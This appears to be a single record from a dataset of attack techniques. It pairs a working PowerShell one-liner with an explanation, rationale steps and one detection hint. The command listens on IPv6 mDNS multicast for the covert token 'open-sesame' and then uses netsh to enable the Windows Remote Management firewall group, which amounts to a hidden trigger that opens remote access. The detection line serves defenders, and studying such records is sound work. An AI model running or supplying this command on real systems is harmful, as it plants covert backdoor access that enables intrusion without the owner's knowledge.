command: $grp=[System.Net.IPAddress]::Parse('ff02::fb');$u=New-Object System.Net.Sockets.UdpClient([System.Net.Sockets.AddressFamily]::InterNetworkV6);$u.Client.SetSocketOption([System.Net.Sockets.SocketOptionLevel]::Socket,[System.Net.Sockets.SocketOptionName]::ReuseAddress,$true);$u.Client.Bind([System.Net.IPEndPoint]::new([System.Net.IPAddress]::IPv6Any,5353));$u.JoinMulticastGroup($grp);$ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::IPv6Any,0);while($true){$b=$u.Receive([ref]$ep);$s=[Text.Encoding]::UTF8.GetString($b);if($s -like '*open-sesame*'){& netsh advfirewall firewall set rule group="Windows Remote Management" new enable=yes;break}}
explanation: Listens on IPv6 mDNS multicast (ff02::fb, UDP/5353) for a payload containing 'open-sesame'. On match, enables the Windows Remote Management firewall group using netsh, exposing management endpoints only after receipt of a covert multicast signal. Requires elevation.
rationale_steps: Join IPv6 mDNS multicast group and read UDP datagrams for a magic token.
Enable WinRM firewall group when the token is observed to expose remote management.
Detection: alert on unexpected UDP/5353 listeners, IPv6 multicast use on servers, and netsh-based enabling of WinRM on systems where it is usually disabled.
